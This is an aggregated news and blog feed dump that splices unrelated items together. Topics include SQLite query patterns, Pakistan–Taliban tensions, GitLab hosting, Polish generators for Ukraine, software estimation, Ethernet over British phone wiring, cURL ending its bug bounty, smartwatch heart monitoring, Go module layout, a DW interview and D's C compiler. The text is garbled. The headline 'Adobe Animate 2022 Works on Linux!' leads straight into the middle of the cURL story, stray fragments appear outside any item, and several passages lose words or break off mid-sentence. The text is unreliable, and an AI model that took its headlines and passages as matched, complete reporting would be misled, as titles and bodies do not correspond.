in the same process address space as the application.  Queries do not
involve message round-trips, only a function call.  The latency
of a single SQL query is far less in SQLite.  Hence, using a large number
of queries with SQLite is not the problem.


The first group of queries in the log are extracting display options
from the "config" and "global_config" tables of the Fossil database.
Then there is a single complex query that extracts a list of all elements
to be displayed on the timeline.
This "timeline" query demonstrates that SQLite can easily process complex
relational database queries involving multiple tables, subqueries, and
complex WHERE clause constraints, and it can make effective use of indexes
to solve the queries with minimal disk I/O.


Following the single big "timeline" query, 
there are additional queries for each timeline element.
Fossil is using the "N+1 Query" pattern rather than trying
to grab all the information in as few queries as possible.
But that is ok because there is no unnecessary IPC overhead.
At the bottom of
each timeline page, Fossil shows approximately how long it took to generate
the page.  For a 50-entry timeline, the latency is usually less than
25 milliseconds.  Profiling shows that few of those milliseconds
were spent inside the database engine.


Using the N+1 Query pattern in Fossil does not harm the application.  
But the N+1 Query pattern does have benefits.  For one, the
section of the code that creates the timeline query can be
completely separate from the section that prepares each timeline
entry for display.
This provides a separation of responsibility that helps keep the code
simple and easy to maintain.  Secondly, the information
needed for display, and the queries needed to extract that information,
vary according to what type of objects are to be shown.  Check-ins need one
set of queries.  Tickets need another set of queries.  Wiki pages need a
different query.  And so forth.  By implementing these queries on-demand
and in the part of the code dealing with the various entities, there is
further separation of responsibility and simplification of the overall 
code base.


So, SQLite is able to do one or two large and complex queries, or it can
do many smaller and simpler queries.  Both are efficient.  An application
can use either or both techniques, depending on what works best for the
situation at hand.

But Pakistan is now fighting the Afghan Taliban it once helped create. During the Soviet occupation of Afghanistan in the 1980s, Pakistan's powerful secret service, the ISI, supported the Mujahideen fighters who formed the Taliban with money, training and weapons. The Taliban regime has been back in power since the sudden withdrawal of US and NATO troops in 2021.
 
A recent shaky ceasefire between Pakistan and the Taliban government in Kabul is complicated by another Taliban grouping: The Pakistani Taliban or Tehreek-e-Taliban Pakistan (TTP). The TTP have been carrying out suicide bombings and attacks in Pakistan. Islamabad has accused the Afghan Taliban of backing the terrorist group and also of giving them refuge inside Afghanistan. But the Afghan Taliban has denied the claims and is now looking to Pakistan's archrival India for support. Meanwhile, a colonial-era border between Afghanistan and Pakistan, the Durand Line, is adding fuel to the fire.

I just started using it at some point and never had a reason to switch.Back when GitHub still charged for private repositories, GitLab offered them for free. That was the initial hook. I had a bunch of small projects and experiments that I didn’t want to publish but also didn’t want to pay for. GitLab was the obvious choice.GitHub eventually made private repos free too, but by then my workflow was already built around GitLab. All my CI pipelines, Docker images, deployment scripts - everything pointed there.The Docker registry thingEvery GitLab project comes with a Container Registry. This is probably the feature I use most.The workflow is simple. Build an image locally or in CI, push it to the registry, pull it wherever you need it.No separate Docker Hub account. No thinking about pull rate limits (remember when Docker Hub introduced those and broke half the internet’s CI pipelines?). No managing access tokens for yet another service.For my private projects this is perfect. I don’t need the discoverability of Docker Hub. I just need a place to store images that integrates with my existing authentication.The 10GB limit per project sounds small on paper but I’ve never come close to hitting it. Old tags get cleaned up, base layers are shared, and most of my images aren’t that big anyway.GitLab CI was one of the earlier “CI config as code” implementations that I used. You drop a  in your repo and things start happening. The config is versioned with everything else, which means you can see exactly what your pipeline looked like six months ago.Nothing fancy. Build the image, push it, optionally deploy. The manual trigger on deploy is nice - I can build automatically but still control when things go to production.The shared runners GitLab provides handle most of my workloads. They’re not fast, but they’re free and reliable. For the times when I needed something specific - like a runner with more memory or access to my private network - setting up my own runner on a cheap VPS was straightforward. Install the runner, register it with a token, done.The documentation for CI/CD is extensive. Almost too extensive. There are so many features and options that finding what you need can take a while. But once you figure out your patterns, you mostly copy-paste from your own previous configs.Let’s talk about what’s not great. The GitLab web interface has always felt sluggish to me. Click on a merge request, wait. Switch to the pipeline view, wait. Open the job log, wait. It’s not terrible, but there’s this constant friction that adds up over a long session.I’ve noticed improvements recently. Either they optimized things or I’ve just gotten used to it - hard to say. But it’s still not as snappy as GitHub. GitLab tries to be everything. Issue tracking, project management, wiki, snippets, package registry, container registry, security scanning, infrastructure management, monitoring… The sidebar menu goes on forever.I use maybe 10% of what’s available. Repositories, merge requests, CI/CD, container registry. That’s pretty much it.This is a double-edged sword. On one hand, feature bloat. On the other, if I ever need something like a private NPM registry or security scanning, it’s already there. I just haven’t needed it yet.I run about a dozen private projects ranging from active side projects to abandoned experiments I keep around “just in case.” None of this costs me anything. It’s crazy.All my private projects live on GitLab. Prototypes, experiments, half-finished ideas, things I’m actively working on but not ready to share. It’s my digital workshop where I can make a mess without anyone watching.GitHub is different. That’s where I put things I want people to see.This split works well for me. I get the collaboration and visibility benefits of GitHub for public stuff while keeping my private mess organized on GitLab with proper CI/CD and container registries.Some people do everything on GitHub. Some do everything on GitLab. Having a foot in both camps might seem redundant but honestly, they serve different purposes in my workflow.]]></content:encoded></item><item><title>Poland to send hundreds of generators to Ukraine amid winter heating crisis</title><link>https://notesfrompoland.com/2026/01/24/poland-to-send-hundreds-of-generators-to-ukraine-amid-winter-heating-crisis/</link><author>Daniel Tilles</author><category>news</category><pubDate>Sat, 24 Jan 2026 10:29:16 +0000</pubDate><source url="https://notesfrompoland.com/">News - Poland</source><content:encoded><![CDATA[Keep our news free from ads and paywalls by making a donation to support our work!Notes from Poland is run by a small editorial team and is published by an independent, non-profit foundation that is funded through donations from our readers. We cannot do what we do without your support.The Polish government is sending 379 power generators from its strategic reserves to Ukraine, where Russian attacks have left many without heat and power amid freezing winter temperatures.Meanwhile, the city of Warsaw is sending an additional 90 generators of its own to help protect Ukrainians from the winter freeze. And a public fundraiser in Poland to buy more generators has now received almost 7 million zloty (€1.7 million) in donations.Ukrainians have been struggling to stay warm amid temperatures regularly dropping below -15°C. Currently, almost 60% of buildings in Kyiv have no electricity and a similar proportion lack heating. President Volodymyr Zelensky accuses Russia of deliberately targeting energy infrastructure to make civilians suffer.In response, Poland announced on Friday that Prime Minister Donald Tusk has ordered the delivery of 379 electricity generators and 18 heating units from the Government Strategic Reserve Agency (RARS) to Ukraine.Government spokesman Adam Szłapka revealed that the equipment is worth around 7 million zloty in total. Shipments began on Friday and are set to be completed next week.“Poland once again reaffirms its role as a key partner to Ukraine in the field of humanitarian aid,” declared Tusk’s office. “The donated equipment will enable the operation of heating stations and public facilities, providing a real protective barrier against the effects of winter in war-affected regions.”Poland, which is the main logistics hub for international support to its eastern neighbour, will also help facilitate the delivery of a further 447 generators being sent by the European Union from its reserves to Ukraine.On Friday, Warsaw’s mayor, Rafał Trzaskowski, announced that his city has readied 90 generators for immediate transport to Kyiv, following an appeal from the Ukrainian capital’s mayor, Vitali Klitschko.“Putin is brutally attacking critical infrastructure,” said Trzaskowski. “We are extending our assistance to Kyiv and our solidarity with the Ukrainian people.”Meanwhile, a public fundraiser in Poland to provide generators and other heating equipment to Ukraine, which had an initial target of 1 million zloty, has so raised 6.8 million zloty (€1.6 million) from over 50,000 donors.On Friday, the first set of generators bought with the money was set to be delivered to Ukraine, reports news website Onet.Earlier this week, Ukraine’s foreign minister, Andrii Sybiha, thanked Poles for their “true solidarity, humanity, and sincere support at a time when warmth and light mean safety and life”.

It goes something like this:Estimating how long software projects will take is very hard, but not impossible. A skilled engineering team can, with time and effort, learn how long it will take for them to deliver work, which will in turn allow their organization to make good business plans.This is, of course, false. As every experienced software engineer knows, it is not possible to accurately estimate software projects. The tension between this polite fiction and its well-understood falseness causes a lot of strange activity in tech companies.For instance, many engineering teams estimate work in t-shirt sizes instead of time, because it just feels too obviously silly to the engineers in question to give direct time estimates. Naturally, these t-shirt sizes are immediately translated into hours and days when the estimates make their way up the management chain.Alternatively, software engineers who are genuinely trying to give good time estimates have ridiculous heuristics like “double your initial estimate and add 20%“. This is basically the same as giving up and saying “just estimate everything at a month”.Should tech companies just stop estimating? One of my guiding principles is that when a tech company is doing something silly, they’re probably doing it for a good reason. In other words, practices that appear to not make sense are often serving some more basic, illegible role in the organization. So what is the actual purpose of estimation, and how can you do it well as a software engineer?Why estimation is impossibleBefore I get into that, I should justify my core assumption a little more. People havewrittena lot about this already, so I’ll keep it brief.I’m also going to concede that sometimes you can accurately estimate software work, when that work is very well-understood and very small in scope. For instance, if I know it takes half an hour to deploy a service, and I’m being asked to update the text in a link, I can accurately estimate the work at something like 45 minutes: five minutes to push the change up, ten minutes to wait for CI, thirty minutes to deploy.For most of us, the majority of software work is not like this. We work on poorly-understood systems and cannot predict exactly what must be done in advance. Most programming in large systems is : identifying prior art, mapping out enough of the system to understand the effects of changes, and so on. Even for fairly small changes, we simply do not know what’s involved in making the change until we go and look.The pro-estimation dogma says that these questions ought to be answered during the planning process, so that each individual piece of work being discussed is scoped small enough to be accurately estimated. I’m not impressed by this answer. It seems to me to be a throwback to the bad old days of software architecture, where one architect would map everything out in advance, so that individual programmers simply had to mechanically follow instructions. Nobody does that now, because it doesn’t work: programmers must be empowered to make architectural decisions, because they’re the ones who are actually in contact with the code. Even if it did work, that would simply shift the impossible-to-estimate part of the process backwards, into the planning meeting (where of course you can’t write or run code, which makes it near-impossible to accurately answer the kind of questions involved).In short: software engineering projects are not dominated by the known work, but by the unknown work, which always takes 90% of the time. However, only the known work can be accurately estimated. It’s therefore impossible to accurately estimate software projects in advance.Estimates do not come from engineersEstimates do not help engineering teams deliver work more efficiently. Many of the most productive years of my career were spent on teams that did no estimation at all: we were either working on projects that had to be done no matter what, and so didn’t really need an estimate, or on projects that would deliver a constant drip of value as we went, so we could just keep going indefinitely.In a very real sense, estimates aren’t even made by engineers at all. If an engineering team comes up with a long estimate for a project that some VP really wants, they will be pressured into lowering it (or some other, more compliant engineering team will be handed the work). If the estimate on an undesirable project - or a project that’s intended to “hold space” for future unplanned work - is too short, the team will often be encouraged to increase it, or their manager will just add a 30% buffer.One exception to this is projects that are technically impossible, or just genuinely prohibitively difficult. If a manager consistently fails to pressure their teams into giving the “right” estimates, that can send a signal up that maybe the work can’t be done after all. Smart VPs and directors will try to avoid taking on technically impossible projects.Another exception to this is areas of the organization that senior leadership doesn’t really care about. In a sleepy backwater, often the formal estimation process does actually get followed to the letter, because there’s no director or VP who wants to jump in and shape the estimates to their ends. This is one way that some parts of a tech company can have drastically different engineering cultures to other parts. I’ll let you imagine the consequences when the company is re-orged and these teams are pulled into the spotlight.Estimates are political tools for non-engineers in the organization. They help managers, VPs, directors, and C-staff decide on which projects get funded and which projects get cancelled. Estimates define the work, not the other way aroundThe standard way of thinking about estimates is that you start with a proposed piece of software work, and you then go and figure out how long it will take. This is entirely backwards. Instead, teams will often start with the estimate, and then go and figure out what kind of software work they can do to meet it.Suppose you’re working on a LLM chatbot, and your director wants to implement “talk with a PDF”. If you have six months to do the work, you might implement a robust file upload system, some pipeline to chunk and embed the PDF content for semantic search, a way to extract PDF pages as image content to capture formatting and diagrams, and so on. If you have one day to do the work, you will naturally search for simpler approaches: for instance, converting the PDF to text client-side and sticking the entire thing in the LLM context, or offering a plain-text “grep the PDF” tool.This is true at even at the level of individual lines of code. When you have weeks or months until your deadline, you might spend a lot of time thinking airily about how you could refactor the codebase to make your new feature fit in as elegantly as possible. When you have hours, you will typically be laser-focused on finding an approach that will actually work. There are always many different ways to solve software problems. Engineers thus have quite a lot of discretion about how to get it done.So how do I estimate, given all that?I gather as much political context as possible before I even look at the code. How much pressure is on this project? Is it a casual ask, or do we  to find a way to do this? What kind of estimate is my management chain looking for? There’s a huge difference between “the CTO  wants this in one week” and “we were looking for work for your team and this seemed like it could fit”.Ideally, I go to the code with an estimate already in hand. Instead of asking myself “how long would it take to do this”, where “this” could be any one of a hundred different software designs, I ask myself “which approaches could be done in one week?“.I spend more time worrying about unknowns than knowns. As I said above, unknown work always dominates software projects. The more “dark forests” in the codebase this feature has to touch, the higher my estimate will be - or, more concretely, the tighter I need to constrain the set of approaches to the known work.Finally, I go back to my manager with a risk assessment, not with a concrete estimate. I don’t ever say “this is a four-week project”. I say something like “I don’t think we’ll get this done in one week, because X Y Z would need to all go right, and at least one of those things is bound to take a lot more work than we expect. Ideally, I go back to my manager with a  of plans, not just one:We tackle X Y Z directly, which  all go smoothly but if it blows out we’ll be here for a monthWe bypass Y and Z entirely, which would introduce these other risks but possibly allow us to hit the deadlineWe bring in help from another team who’s more familiar with X and Y, so we just have to focus on ZIn other words, I don’t “break down the work to determine how long it will take”. My management chain already knows how long they want it to take. My job is to figure out the set of software approaches that match that estimate.Sometimes that set is empty: the project is just impossible, no matter how you slice it. In that case, my management chain needs to get together and figure out some way to alter the requirements. But if I always said “this is impossible”, my managers would find someone else to do their estimates. When I do that, I’m drawing on a well of trust that I build up by making pragmatic estimates the rest of the time.Addressing some objectionsMany engineers find this approach distasteful. One reason is that they don’t like estimating in conditions of uncertainty, so they insist on having all the unknown questions answered in advance. I have written a lot about this in Engineers who won’t commit and How I provide technical clarity to non-technical leaders, but suffice to say that I think it’s cowardly. If you refuse to estimate, you’re forcing someone less technical to estimate for you.Some engineers think that their job is to constantly push back against engineering management, and that helping their manager find technical compromises is betraying some kind of sacred engineering trust. I wrote about this in Software engineers should be a little bit cynical. If you want to spend your career doing that, that’s fine, but I personally find it more rewarding to find ways to work with my managers (who have almost exclusively been nice people).Other engineers might say that they rarely feel this kind of pressure from their directors or VPs to alter estimates, and that this is really just the sign of a dysfunctional engineering organization. Maybe! I can only speak for the engineering organizations I’ve worked in. But my suspicion is that these engineers are really just saying that they work “out of the spotlight”, where there’s not much pressure in general and teams can adopt whatever processes they want. There’s nothing wrong with that. But I don’t think it qualifies you to give helpful advice to engineers who do feel this kind of pressure.I think software engineering estimation is generally misunderstood.The common view is that a manager proposes some technical project, the team gets together to figure out how long it would take to build, and then the manager makes staffing and planning decisions with that information. In fact, it’s the reverse: a manager comes to the team with an estimate already in hand (though they might not come out and admit it), and then the team must figure out what kind of technical project might be possible within that estimate.This is because estimates are not by or for engineering teams. They are tools used for managers to negotiate with each other about planned work. Very occasionally, when a project is literally impossible, the estimate can serve as a way for the team to communicate that fact upwards. But that requires trust. A team that is always pushing back on estimates will not be believed when they do encounter a genuinely impossible proposal.When I estimate, I extract the range my manager is looking for, and only then do I go through the code and figure out what can be done in that time. I never come back with a flat “two weeks” figure. Instead, I come back with a range of possibilities, each with their own risks, and let my manager make that tradeoff.It is not possible to accurately estimate software work. Software projects spend most of their time grappling with unknown problems, which by definition can’t be estimated in advance. To estimate well, you must therefore basically ignore all the known aspects of the work, and instead try and make educated guesses about how many unknowns there are, and how scary each unknown is.edit: I should thank one of my readers, Karthik, who emailed me to ask about estimates, thus revealing to me that I had many more opinions than I thought.edit: This post got a bunch of comments on Hacker News. Some non-engineers made the point that well-paid professionals should be expected to estimate their work, even if the estimate is completely fictional. Sure, I agree, as long as we’re on the same page that it’s fictional!A couple of engineersargued that estimation was a solved problem. I’m not convinced by their examples. I agree you can probably estimate “build a user flow in Svelte”, but it’s much harder to estimate “build a user flow in Svelte on top of an existing large codebase”. I should have been more clear in the post that I think that’s the hard part, for the normal reasons that it’s very hard to work in large codebases, which I writeaboutendlessly on this blog.edit: There are also some comments on Lobste.rs, including a good note that the capability of the team obviously has a huge impact on any estimates. In my experience, this is not commonly understood: companies expect estimates to be fungible between engineers or teams, when in fact some engineers and teams can deliver work ten times more quickly (and others cannot deliver work , no matter how much time they have).]]></content:encoded></item><item><title>Why Developing For Microsoft SharePoint is a Horrible, Terrible, and Painful Experience</title><link>https://medium.com/@jordansrowles/why-developing-for-microsoft-sharepoint-is-a-horrible-terrible-and-painful-experience-aa1f5d50712c</link><author>/u/jordansrowles</author><category>reddit</category><pubDate>Sat, 24 Jan 2026 10:22:08 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Doing gigabit Ethernet over my British phone wires</title><link>https://thehftguy.com/2026/01/22/doing-gigabit-ethernet-over-my-british-phone-wires/</link><author>user5994461</author><category>hn</category><pubDate>Sat, 24 Jan 2026 10:14:31 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[: None of this is written by AI, I’m still a real person writing my own blog like its 1999I finally figured out how to do Gigabit Ethernet over my existing phone wires.Powerline adapter and miseryI’ve mostly lived with powerline adapters over recent years. Some worked well, some did not (try few and return what doesn’t work in your home). One I had for a while gave me stable 30 Mbps, which was little but good enough for internet at the time. I care very much about having stable low latency for gaming, more than bandwidth.Fast forward to my current situation, that powerline adapter regularly lost connection which was a major problem. I got some new ones with the latest and greatest G.hn 2400 standard. The final contender served around 180 Mbps to my office (with high variance 120 to 280 Mbps), or around 80 Mbps to the top floor. It’s good enough to watch YouTube/TV yet it’s far from impressive.One peculiar thing from the UK: Internet providers don’t truly offer gigabit internet. They have a range of deals like 30 Mbps – 75 Mbps – 150 Mbps – 300 Mbps – 500 Mbps – 900 Mbps, each one costing a few more pounds per month than the last. This makes the UK simultaneously one of the cheapest and one of the most expensive countries to get Internet. Long story short, new place, new hardware, new deals, the internet has been running at 500 Mbps for some time now.Problem: How to get 500 Mbps to my room?A Fetish for Phone SocketsI’ve been looking for a way to reuse phone wires for a while, because British houses are full of phone sockets. There are 2 sockets in my office room.I can’t stress enough how much we love our phone sockets. It’s not uncommon to have a one bed flat with 2 phone sockets in the living room and 2 phone sockets in the bedroom and a master socket in the technical room. It’s ridiculous.A new house bought today could have 10 phone sockets and 0 Ethernet sockets. There is still no regulation that requires new build to get Ethernet wiring (as far as I know).There’s got to be a way to use the existing phone infrastructure.I know the technology exists. It’s one of the rare cases where the technology exists and is mature, but nobody can be bothered to make products for it.The standards that run powerline adapters (HomePlug AV200, AV500, G.hn 2400) can work with any pair of wires. It should work ten times better on dedicated phone wires instead of noisy power wires, if only manufacturers could be bothered to pull their fingers out of their arse and make the products that are needed.It’s made and shipped from Germany.I was lazy so I ordered online in self-service (which is definitely the wrong way to go about it). It’s available on Ebay DE and Amazon DE, it’s possible to order from either with a UK account, make sure to enter a UK address for delivery (some items don’t allow it).The better approach is almost certainly to speak to the seller to get a quote, with international shipping and the import invoice excluding VAT (to avoid paying VAT on VAT).The package got the usual Royal Mail treatment:The package was shipped by DHL GermanyThe package was transferred to Royal Mail when entering the UKAfter some days, the DHL website said they tried to deliver but nobody home, this is bullshitRoyal website said the package reached the depot and was awaiting delivery, this is bullshitIn reality, the package was stuck at the border, as usualGoogle to find “website to pay import fee on parcel”Entered the DHL tracking number into the Royal Mail form for a Royal Mail tracking numberThe website said that the parcel had import fees to pay, this is correctPaid the fee online, 20% VAT + a few pounds of handling feesThe package will be scheduled for delivery a few days laterRoyal Mail and DHL updated their status another two or three times with false informationRoyal Mail delivered a letter saying there was a package waiting on fees, though it was paidThe package finally arrivedBasically, you need to follow the tracking regularly until the package is tagged as lost or failed delivery, which is the cue to pay import fees.It’s the normal procedure to buy things from Europe since Brexit 2020. It’s actually quite shocking that Royal Mail still hasn’t updated their tracking system to be able to give a status “waiting on import fees to be paid online”. They had 6 years!A pair of gigacopper G4201TMThe device has a German power socket (expected)It came with a German to UK power adapter (unexpected and useful)It came with a standard RJ11 cable (expected and useless)Found BT631A to RJ11 cables online (the standard UK phone socket)Found Ethernet cables in my toolbox3M removable hanging strip to stick to the wall, the device is very lightThere is a gigacopper G4202TM: with an RJ45 to connect to the phone line instead of a RJ11 (not sure if it’s a newer model or just a variant, as that one has two gigabit Ethernet ports). Don’t be confused by having a RJ45 port that is not a RJ45 port.There is a gigacopper G4201C (1 port) and G4204C (4 port) for Ethernet over coaxial. Some countries have coax in every room for TV/satellite. This may be of interest to some readers.Reminder, this is a 500 Mbps internet connection.I discovered soon afterwards that I bought the wrong item. There is an InHome and a Client/Server variant of the product. Make sure to buy the InHome variant.The InHome variant can have up to 16 devices, communicating to any peer on the medium, with sub millisecond latency.The client-server variant is preconfigured as a pair, splitting the bandwidth 70% download / 30% upload, with few milliseconds latency. I think it’s a use case for ISP and long range connections.Thankfully the difference is only the firmware. I spoke to the vendor who was very helpful and responsive. They sent me the firmware and the tools to patch.I have a fetish for low latency. This screenshot is oddly satisfying.The web interface says 1713 Mbps on the physical layer, the debugging tool says PHONE 200MHz – Connected 1385 Mbps.I wanted to verify whether the device can do a full Gigabit. Unfortunately I realized I don’t have any device that can test that.Phones are wireless, which is too slow to test anything. I checked out of curiosity, my phone did 100 Mbps to 400 Mbps right next to the router. Grabbed two laptops only to realize they didn’t have any Ethernet port. I dug up an old laptop from storage with an Ethernet port. The laptop couldn’t boot, the CPU fan didn’t start and the laptop refused to boot with a dead fan.There is a hard lesson here: 1 Gbps ought to be enough for any home. Using the phone line is as good as having Ethernet wiring through the house if it can deliver a (shared) 1.7 Gbps link to multiple rooms.Still, I really wanted to verify that the device can do a full Gbps, I procured an USB-C to Ethernet adapter.Full speed achieved, testing from a phone to a computer with iperf3.Some readers might wonder about the wiring.I didn’t check the wiring before buying anything because it’s pointless. British sockets are always daisy chained in an incomprehensible maze.Phone sockets need 2 wires and can be daisy chained. Ethernet sockets need 8 wires. They often use the same Cat5 cable because it’s the most widely available (8 wires cable, the 6 extra wires can remain unconnected). It’s possible to swap the phone socket for an RJ45 socket, if you only have 2 sockets connected with the right cable. It’s not possible when sockets are daisy chained. (You could put a double or triple RJ45 socket with a switch to break a daisy chain, but it quickly becomes impractical in a British house with 5 to 10 sockets in an arbitrary layout.)I opened one socket in the office room. There are two Cat5 cables daisy chained. There are 3 wires connected.It’s probably daisy chained with the other socket in the room, or it’s daisy chained with the socket in the other room that’s closer. Who knows.I opened the BT master socket in the technical room. It should have the cables coming from the other rooms. It should connect the internal phone wires with the external phone line.There is one single Cat5 cable. There are 4 wires connected. It’s definitely not a master socket. WTF?!It’s interesting that this socket has 4 wires connected but the socket in the office has 3 wires connected. The idiot who did the wiring was inconsistent. The gigacopper device can operate over 2 wires (200 MHz Phone SISO) or over 4 wires (100 MHz Phone MIMO). I can try the other modes if I finish the job.The search for the master socket continues. The cables from the other floors should all be coming down somewhere around here. There is a blank plate next to it (right). This might be the external phone line? A bunch of wires are crimped together, colours do not match. It’s the hell of a mess.Only sure thing, they are different cables because they are different colours. They might be going to a junction box somewhere else. Probably behind a wall that’s impossible to access!Conclusion: There is zero chance to get proper Ethernet wiring out of this mess.The gigacopper device to do gigabit Ethernet over phone line is a miracle!There is an enormous untapped market for gigabit Ethernet over phone sockets in the UK.]]></content:encoded></item><item><title>Adobe Animate 2022 Works on Linux!

We are now in 2026, and the situation has reached a tipping point.For context, cURL is an open source command-line tool used by billions of devices worldwide.cURL Says Enough is EnoughDaniel has submitted a pull request on GitHub that removes all mentions of the bug bounty program from cURL's documentation and website. Coinciding with that, the project's security.txt file has been updated with some blunt language that makes the new policy crystal clear.The cURL team intends to make a proper announcement in the coming days, though many outlets have already covered the news of this happening, so I would say they ought to get on it ASAP! 😆The program officially ends in a few days on January 31, 2026. After that, security researchers can still report issues through GitHub or the project's mailing list, but there won't be any cash involved.What pushed them over the edge?, you ask. Well, just weeks into 2026, seven HackerOne reports came in within a 16-hour period in just one week. Some were actual bugs, but none of them were security vulnerabilities. By the time Daniel posted his recent weekly report, they'd already dealt with 20 submissions in 2026.The main goal here is said to be stopping the flood of garbage reports. By eliminating the money incentive, they are hoping people () will stop wasting the security team's time with half-baked, unresearched submissions.He also gives a stern warning to wannabe AI sloppers, saying that:This is a balance of course, but I also continue to believe that exposing, discussing and ridiculing the ones who waste our time is one of the better ways to get the message through: you should NEVER report a bug or a vulnerability unless you actually understand it - and can reproduce it. If you still do, I believe I am in the right to make fun of - and be angry at - the person doing it.So, yeah, that's that. If people still don't understand that AI slop is harmful to such sensitive pieces of software, then sure, they can go ahead and make a fool of themselves.]]></content:encoded></item><item><title>Smartwatches Help Detect Abnormal Heart Rhythms 4x More Often In Clinical Trial</title><link>https://science.slashdot.org/story/26/01/24/0114249/smartwatches-help-detect-abnormal-heart-rhythms-4x-more-often-in-clinical-trial?utm_source=rss1.0mainlinkanon&amp;utm_medium=feed</link><author>BeauHD</author><category>tech</category><pubDate>Sat, 24 Jan 2026 10:00:00 +0000</pubDate><source url="https://slashdot.org/">Slashdot</source><content:encoded><![CDATA[A clinical trial found that seniors at high stroke risk who wore an Apple Watch were four times more likely to have hidden heart rhythm disorders detected than those receiving standard care. The researchers noted that over half the time, these smartwatch wearers with heart rhythm problems hadn't shown any symptoms prior to diagnosis. From U.S. News & World Report: Later editions of Apple Watches are equipped with two functions that can help monitor heart health -- photoplethysmography (PPG), which tracks heart rate, and a single-lead electrocardiogram (ECG) that monitors heart rhythm. "Using smartwatches with PPG and ECG functions aids doctors in diagnosing individuals unaware of their arrhythmia, thereby expediting the diagnostic process," said senior researcher Dr. Michiel Winter, a cardiologist at Amsterdam University Medical Center in The Netherlands. "Our findings suggest a potential reduction in the risk of stroke, benefiting both patients and the health care system by reducing costs," Winter said in a news release.
 
[...] Smartwatches are much easier than other wearable devices for detecting irregular heart rhythms [...]. These other means require people to wear sticky leads, carry around bulky monitors or even receive short-term implants. Lead researcher Nicole van Steijn, a doctoral candidate at Amsterdam UMC, noted that wearables that track both the pulse and electrical activity have been around for a while. "However, how well this technology works for the screening of patients at elevated risk for atrial fibrillation had not yet been investigated in a real-world setting,"she said in a news release. The findings have been published in the Journal of the American College of Cardiology.]]></content:encoded></item><item><title>Russia attacks Kyiv, Kharkiv as Abu Dhabi talks set to continue | DW News</title><link>https://www.youtube.com/watch?v=jryBb9oZWJ0</link><author>DW News</author><category>news</category><enclosure url="https://www.youtube.com/v/jryBb9oZWJ0?version=3" length="" type=""/><pubDate>Sat, 24 Jan 2026 09:02:00 +0000</pubDate><source url="https://www.youtube.com/channel/UCknLrEdhRCp1aegoMqRaCZg">News - DW</source><content:encoded><![CDATA[Russia has pummeled Ukraine's two largest cities in overnight strikes, as negotiators hold talks on ending the war.

AFAICT, this is generally advised against. Why? And is there a respected/authoritative guide I can refer to.I can immediately tell there would be versioning confusion; but other relevant reasons why?The PR does address a valid problem, for which a different solution was planned. So I'm more inclined to have a constructive discussion than dismissing it outright.The problem is, Gost-DOM, my headless browser with a build-in script engine has a dependency to V8, a huge dependency. A script engine is . A plugin-interface has evolved as well as a pure Go alternative: sobek (a fork of Goja with ESM support)So users of Gost-DOM will receive a dependency to both V8 AND sobek in their own  file.AFAIK, this shouldn't affect build times, merely download, as Go doesn't compile packages you don't actually use.

Having everything in one code repository/module makes it significantly easier to work with.Note: there are already two nested modules in the repo, but they are tools in  package scope.I created  files here, exactly for that reason, to shield client code of Gost-DOM from dependencies irrelevant for them.

DW Chief Political Correspondent
So, Ines, if you could just maybe help me get this thought across that there is a lot... Germany and Europe do hold cards, right? Also, in terms of defense, what are the cards that you would say Germany needs to put into the window more? 

Ines Pohl
DW Washington Bureau Chief
I mean, you just explained it, right? There are major, very strategically, highly important operations being led in Germany. And then, of course, also the wounded soldiers being flown in. That's something many, kind of, American families have experienced, that Germany plays a major role here. But, Nina, the problem is, when it comes to the public discourse, Donald Trump has really, kind of, taken this understanding away and is dominating the discourse with exactly what you said: "Germany and Europe... They have great schools. They don't pay anything. They have great streets. They have everything cheap for the average people because we pay for them." And this is, kind of, this is what most Americans believe now. They don't — I mean, if you talk, of course, to a military expert, they would totally agree that the United States needs Germany also for their own security and safety reasons — but the average Americans don't see that anymore, especially as Donald Trump also says, you know, "I'm a peacemaker. I stopped so many wars. I want us to be less involved in other countries, militarily-wise." So, Germany, in this strategic thinking, is becoming even less important. That's, I think, not true. But if you ask the majority of the Americans, they would, I think, go by now with Donald Trump's false claims.

But there are baffling things that have not been fixed at all.
The Dlang community embedded a C compiler in the D programming language compiler so it could compile C.
This C compiler (aka ) was built from scratch.
It provided the opportunity to use modern compiler technology to fix those shortcomings.
Why doesn’t Standard C fix them?
Evaluating Constant ExpressionsForward Referencing of DeclarationsEvaluating Consider the following C code:
int sum(int a, int b) { return a + b; }

enum E { A = 3, B = 4, C = sum(5, 6) };
gcc -c test.c
test.c:3:20: error: enumerator value for C is not an integer constant
 enum E { A = 3, B, C = sum(5, 6) };
                    ^


In other words, while C can compute at compile time a simple expression
by ,
it cannot execute a function at compile time. But  can.

Everywhere a C  appears in the C grammar
the compiler should be able to execute functions at compile time, too,
as long as the functions do not do things like I/O, access mutable global
variables, make system calls, etc.Compile Time Unit TestingOnce the C compiler can do compile time function evaluation (CTFE), suddenly
other things become possible.For example, ever notice that seeing unit tests in C code is (unfortunately)
rather rare? The reason is simple - unittests require a separate target in the
build system, and must be built and run as a separate executable. Being a bit of a
nuisance means it just does not happen. (Maybe you are one of those people who
get up and jog a mile every morning, and you probably also carefully write unit
test setups! I know you exist out there - somewhere!)
int sum(int a, int b) { return a + b; }

_Static_assert(sum(3, 4) == 7, "test #1");
gcc -c test.c
test.c:3:16: error: expression in static assertion is not constant
_Static_assert(sum(3, 4) == 7, "test #1");
               ^
This enables unit tests of functions that can be run at compile
time. No separate build is required. No extra work is required. The unit tests
run  the code is compiled. I use this extensively in the test suite
for .Forward Referencing of Declarationsint floo(int a, char *s) { return dex(s, a); }

char dex(char *s, int i) { return s[i]; }
gcc -c test.c
test.c:4:6: error: conflicting types for dex
 char dex(char *s, int i) { return s[i]; }
      ^
test.c:2:35: note: previous implicit declaration of dex was here
 int floo(int a, char *s) { return dex(s, a); }
If the order of floo and dex are reversed, it compiles fine.
I.e. the compiler only knows about what lexically precedes it.
Forward references are not allowed.
Isn’t this stone age compiler design? Modern languages don’t have this
problem, why does it persist in C and C++?  is not a modern language,
but it is a modern compiler and accepts arbitrary orders of the global
declarations.Why does this matter? It usually means that every forward definition needs
an extra declaration:char dex(char *s, int i); // declaration

int floo(int a, char *s) { return dex(s, a); }

char dex(char *s, int i) { return s[i]; } // definition
It’s just purposeless busywork to do that. Not only is it a nuisance, it drives
programmers to lay out the declarations . The leaf functions come first,
and the global interface functions are last. It’s like reading a newspaper article from
